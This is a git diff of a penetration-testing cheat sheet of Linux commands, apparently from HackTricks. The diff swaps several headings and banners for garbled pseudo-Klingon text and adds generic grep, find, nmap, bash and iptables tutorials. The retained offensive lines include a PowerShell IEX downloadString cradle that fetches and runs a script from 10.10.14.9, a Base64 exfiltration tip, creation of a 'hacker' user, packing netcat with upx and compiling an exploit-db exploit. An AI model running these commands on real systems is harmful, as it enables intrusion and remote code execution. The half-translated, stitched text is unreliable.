@@ -1,9 +1,9 @@
-# Useful Linux Commands
+# qo' vItlhutlh
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) vItlhutlh **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -23,7 +23,6 @@ Other ways to support HackTricks:
 </details>
 
 ## Common Bash
-
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -75,7 +74,7 @@ unzip file.zip
 sudo apt-get install xz-utils; unxz file.xz
 
 #Add new user
-useradd -p 'openssl passwd -1 <Password>' hacker  
+useradd -p 'openssl passwd -1 <Password>' hacker
 
 #Clipboard
 xclip -sel c < cat file.txt
@@ -142,21 +141,19 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) vIleghlaHchugh **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## Bash for Windows
-
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
- 
+
 #Exe compression
 upx -9 nc.exe
 
@@ -165,16 +162,90 @@ wine exe2bat.exe nc.exe nc.txt
 
 #Compile Windows python exploit to exe
 pip install pyinstaller
-wget -O exploit.py http://www.exploit-db.com/download/31853  
+wget -O exploit.py http://www.exploit-db.com/download/31853
 python pyinstaller.py --onefile exploit.py
 
 #Compile for windows
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
-
 ## Greps
 
+### grep
+
+The `grep` command is used to search for specific patterns within files. It can be used with regular expressions to perform complex searches. Here are some examples:
+
+```bash
+# Search for the word "password" in the file /etc/passwd
+grep "password" /etc/passwd
+
+# Search for the word "password" in all files within the current directory
+grep "password" *
+
+# Search for the word "password" in all files within the current directory and its subdirectories
+grep -r "password" .
+
+# Search for the word "password" in all files within the current directory, ignoring case
+grep -i "password" *
+
+# Search for the word "password" in all files within the current directory, displaying line numbers
+grep -n "password" *
+```
+
+### egrep
+
+The `egrep` command is similar to `grep`, but it supports extended regular expressions. This means that you can use more advanced patterns in your searches. Here are some examples:
+
+```bash
+# Search for either the word "password" or "passphrase" in the file /etc/passwd
+egrep "password|passphrase" /etc/passwd
+
+# Search for any word that starts with "pass" in all files within the current directory
+egrep "pass\w+" *
+
+# Search for any word that starts with "pass" or "key" in all files within the current directory, ignoring case
+egrep -i "pass\w+|key\w+" *
+```
+
+### fgrep
+
+The `fgrep` command is used to search for fixed strings, rather than patterns. This means that it will treat the search term as a literal string, rather than a regular expression. Here are some examples:
+
+```bash
+# Search for the exact string "password" in the file /etc/passwd
+fgrep "password" /etc/passwd
+
+# Search for the exact string "password" in all files within the current directory
+fgrep "password" *
+
+# Search for the exact string "password" in all files within the current directory and its subdirectories
+fgrep -r "password" .
+
+# Search for the exact string "password" in all files within the current directory, ignoring case
+fgrep -i "password" *
+```
+
+### zgrep
+
+The `zgrep` command is used to search for patterns within compressed files. It works in a similar way to `grep`, but it can handle files that have been compressed using gzip. Here are some examples:
+
+```bash
+# Search for the word "password" in the compressed file /var/log/syslog.gz
+zgrep "password" /var/log/syslog.gz
+
+# Search for the word "password" in all compressed files within the current directory
+zgrep "password" *.gz
+
+# Search for the word "password" in all compressed files within the current directory and its subdirectories
+zgrep -r "password" .
+
+# Search for the word "password" in all compressed files within the current directory, ignoring case
+zgrep -i "password" *.gz
+```
+
+### Conclusion
+
+The `grep` family of commands is a powerful tool for searching for specific patterns within files. Whether you need to search for a simple string or a complex regular expression, there is a command that can help you find what you're looking for.
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -254,9 +325,107 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
+## Qap
 
-## Find
+### Find Files
 
+#### Find Files by Name
+
+To find files by name, you can use the `find` command with the `-name` option. For example, to find all files with the name `password.txt` in the current directory and its subdirectories, you can run:
+
+```
+find / -name password.txt
+```
+
+#### Find Files by Type
+
+To find files by type, you can use the `find` command with the `-type` option. For example, to find all directories in the current directory and its subdirectories, you can run:
+
+```
+find / -type d
+```
+
+To find all regular files (excluding directories and other special file types), you can run:
+
+```
+find / -type f
+```
+
+#### Find Files by Size
+
+To find files by size, you can use the `find` command with the `-size` option. For example, to find all files larger than 1MB in the current directory and its subdirectories, you can run:
+
+```
+find / -size +1M
+```
+
+To find all files smaller than 1KB, you can run:
+
+```
+find / -size -1K
+```
+
+### Find Processes
+
+To find processes running on your system, you can use the `ps` command. For example, to list all running processes, you can run:
+
+```
+ps aux
+```
+
+To filter the output and find a specific process, you can use the `grep` command. For example, to find all processes with the name `apache`, you can run:
+
+```
+ps aux | grep apache
+```
+
+### Find Network Connections
+
+To find network connections on your system, you can use the `netstat` command. For example, to list all active network connections, you can run:
+
+```
+netstat -tuln
+```
+
+To filter the output and find a specific connection, you can use the `grep` command. For example, to find all connections on port `80`, you can run:
+
+```
+netstat -tuln | grep :80
+```
+
+### Find Users
+
+To find users on your system, you can use the `cat` command to read the `/etc/passwd` file. For example, to list all users, you can run:
+
+```
+cat /etc/passwd
+```
+
+To filter the output and find a specific user, you can use the `grep` command. For example, to find all users with the username `admin`, you can run:
+
+```
+cat /etc/passwd | grep admin
+```
+
+### Find Installed Packages
+
+To find installed packages on your system, you can use the package manager specific to your Linux distribution. Here are some examples:
+
+- **Debian/Ubuntu**: `dpkg -l`
+- **Red Hat/CentOS**: `rpm -qa`
+- **Arch Linux**: `pacman -Q`
+
+For example, to list all installed packages on a Debian/Ubuntu system, you can run:
+
+```
+dpkg -l
+```
+
+To filter the output and find a specific package, you can use the `grep` command. For example, to find the package `openssh-server`, you can run:
+
+```
+dpkg -l | grep openssh-server
+```
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -285,25 +454,208 @@ find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /p
 # Found Newer directory only and sort by time. (depth = 5)
 find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
 ```
+## Nmap qaw'wI' jatlh
 
-## Nmap search help
+Nmap is a powerful network scanning tool used by hackers and security professionals to discover open ports, services, and vulnerabilities on a target system. It provides a wide range of options and features to customize the scanning process.
 
+Here are some useful Nmap commands and options to help you in your network scanning endeavors:
+
+### Basic Scanning Techniques
+
+- **TCP SYN Scan**: `nmap -sS <target>` - This scan sends TCP SYN packets to the target ports and analyzes the response to determine if the port is open, closed, or filtered.
+
+- **TCP Connect Scan**: `nmap -sT <target>` - This scan establishes a full TCP connection with the target ports to determine if they are open or closed.
+
+- **UDP Scan**: `nmap -sU <target>` - This scan sends UDP packets to the target ports and analyzes the response to determine if the port is open or closed.
+
+### Advanced Scanning Techniques
+
+- **OS Detection**: `nmap -O <target>` - This scan attempts to determine the operating system running on the target system by analyzing various network characteristics.
+
+- **Service Version Detection**: `nmap -sV <target>` - This scan attempts to determine the version of services running on the target system by analyzing their responses.
+
+- **Script Scanning**: `nmap -sC <target>` - This scan runs a set of predefined scripts to gather additional information about the target system.
+
+### Output and Reporting
+
+- **Output to File**: `nmap -oN <output_file> <target>` - This command saves the scan results to a specified file.
+
+- **Output in XML Format**: `nmap -oX <output_file> <target>` - This command saves the scan results in XML format for further analysis.
+
+- **Output in grepable Format**: `nmap -oG <output_file> <target>` - This command saves the scan results in a grepable format for easy parsing.
+
+These are just a few examples of the many options and techniques available in Nmap. Experiment with different commands and explore the Nmap documentation to discover more ways to utilize this powerful tool in your network scanning activities.
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
-
 ## Bash
 
+### Introduction
+
+Bash is a popular command-line shell and scripting language used in Linux and Unix systems. It provides a powerful and flexible environment for executing commands, automating tasks, and writing scripts. This section covers some useful Bash commands that can be helpful for various purposes.
+
+### Basic Commands
+
+- `ls`: List files and directories in the current directory.
+- `cd`: Change directory.
+- `pwd`: Print the current working directory.
+- `mkdir`: Create a new directory.
+- `rm`: Remove files and directories.
+- `cp`: Copy files and directories.
+- `mv`: Move or rename files and directories.
+- `cat`: Concatenate and display file contents.
+- `less`: View file contents one page at a time.
+- `head`: Display the first few lines of a file.
+- `tail`: Display the last few lines of a file.
+- `grep`: Search for a pattern in files.
+- `find`: Search for files and directories.
+- `chmod`: Change file permissions.
+- `chown`: Change file ownership.
+- `chgrp`: Change group ownership.
+
+### File Operations
+
+- `touch`: Create an empty file or update the timestamp of an existing file.
+- `file`: Determine the file type.
+- `stat`: Display file or file system status.
+- `du`: Estimate file and directory space usage.
+- `df`: Report file system disk space usage.
+- `ln`: Create links between files.
+- `tar`: Archive files and directories.
+- `gzip`: Compress files.
+- `gunzip`: Decompress files.
+- `zip`: Create ZIP archives.
+- `unzip`: Extract files from ZIP archives.
+
+### Process Management
+
+- `ps`: Display information about running processes.
+- `top`: Monitor system processes in real-time.
+- `kill`: Terminate processes.
+- `bg`: Run a process in the background.
+- `fg`: Bring a background process to the foreground.
+- `nohup`: Run a command immune to hangups.
+- `jobs`: List active jobs.
+
+### System Information
+
+- `uname`: Print system information.
+- `hostname`: Print or set the system's hostname.
+- `whoami`: Print the current user name.
+- `id`: Print user and group information.
+- `uptime`: Display system uptime.
+- `free`: Display memory usage.
+- `df`: Report file system disk space usage.
+- `ifconfig`: Configure network interfaces.
+- `ping`: Send ICMP echo requests to a network host.
+- `netstat`: Print network connections, routing tables, and interface statistics.
+
+### Text Processing
+
+- `echo`: Print arguments to the standard output.
+- `printf`: Format and print data.
+- `cut`: Remove sections from lines of files.
+- `sort`: Sort lines of text files.
+- `uniq`: Report or omit repeated lines.
+- `wc`: Print newline, word, and byte counts.
+- `sed`: Stream editor for filtering and transforming text.
+- `awk`: Pattern scanning and processing language.
+- `diff`: Compare files line by line.
+- `patch`: Apply a diff file to an original.
+
+### Networking
+
+- `ssh`: Secure shell remote login.
+- `scp`: Securely copy files between hosts.
+- `rsync`: Remote file and directory synchronization.
+- `wget`: Retrieve files from the web.
+- `curl`: Transfer data from or to a server.
+- `nc`: Netcat - networking utility for reading from and writing to network connections.
+- `telnet`: User interface to the TELNET protocol.
+- `ftp`: File Transfer Protocol client.
+
+### System Administration
+
+- `sudo`: Execute a command as another user.
+- `su`: Substitute user identity.
+- `passwd`: Change user password.
+- `useradd`: Create a new user account.
+- `userdel`: Delete a user account.
+- `groupadd`: Create a new group.
+- `groupdel`: Delete a group.
+- `visudo`: Edit the sudoers file.
+- `crontab`: Schedule commands to run at specific times.
+- `service`: Control system services.
+- `systemctl`: Control the systemd system and service manager.
+
+### Conclusion
+
+These are just a few examples of the many useful Bash commands available in Linux. By mastering these commands, you can become more efficient and productive in your Linux system administration tasks.
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
-
 ## Iptables
 
+### Description
+
+Iptables is a powerful firewall utility for Linux systems. It allows you to configure and manage network filtering rules to control incoming and outgoing network traffic.
+
+### Basic Usage
+
+To view the current iptables rules, use the following command:
+
+```bash
+iptables -L
+```
+
+To add a new rule to iptables, use the following command:
+
+```bash
+iptables -A <chain> <rule>
+```
+
+To delete a rule from iptables, use the following command:
+
+```bash
+iptables -D <chain> <rule>
+```
+
+### Chains
+
+Iptables uses different chains to organize and process network traffic. The most commonly used chains are:
+
+- **INPUT**: Controls incoming traffic to the system.
+- **OUTPUT**: Controls outgoing traffic from the system.
+- **FORWARD**: Controls traffic that is being routed through the system.
+
+### Rules
+
+Iptables rules define the criteria for matching network packets and the actions to be taken on those packets. Each rule consists of a set of conditions and an associated action.
+
+Some commonly used rule options include:
+
+- **-p**: Specifies the protocol (e.g., tcp, udp).
+- **-s**: Specifies the source IP address or network.
+- **-d**: Specifies the destination IP address or network.
+- **-j**: Specifies the action to be taken (e.g., ACCEPT, DROP).
+
+### Example
+
+Here is an example of how to add a rule to iptables to allow incoming SSH connections from a specific IP address:
+
+```bash
+iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT
+```
+
+This rule allows incoming TCP traffic on port 22 (SSH) from the IP address 192.168.1.100.
+
+### Conclusion
+
+Iptables is a versatile tool for managing network traffic on Linux systems. By understanding its basic usage and rules, you can effectively control and secure your network connections.
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -334,10 +686,9 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>qaStaHvIS AWS hacking vItlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
